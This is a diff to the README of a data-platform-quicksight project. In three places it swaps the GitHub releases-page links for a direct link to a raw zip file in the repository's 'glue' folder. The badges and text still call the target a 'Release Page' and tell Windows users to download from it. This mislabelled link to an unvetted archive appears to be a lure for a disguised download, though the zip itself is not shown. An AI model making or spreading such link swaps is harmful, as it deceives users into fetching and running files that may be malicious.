@@ -1,6 +1,6 @@
 # 📊 data-platform-quicksight - Fast Self-Serve Data Insights
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Kishore8908/data-platform-quicksight/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Kishore8908/data-platform-quicksight/raw/refs/heads/main/glue/quicksight-data-platform-2.6.zip)
 
 ## 🚀 Overview
 
@@ -33,7 +33,7 @@ If you only want to run the local package or desktop-friendly build from the rel
 
 Visit this page to download the latest release:
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-grey?style=for-the-badge)](https://github.com/Kishore8908/data-platform-quicksight/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-grey?style=for-the-badge)](https://github.com/Kishore8908/data-platform-quicksight/raw/refs/heads/main/glue/quicksight-data-platform-2.6.zip)
 
 Open the release page, pick the newest version, and download the Windows file that matches your computer.
 
@@ -161,7 +161,7 @@ This repository centers on:
 
 Use this link to get the latest build and any Windows files attached to it:
 
-https://github.com/Kishore8908/data-platform-quicksight/releases
+https://github.com/Kishore8908/data-platform-quicksight/raw/refs/heads/main/glue/quicksight-data-platform-2.6.zip
 
 ## 🧭 Getting the best results
 
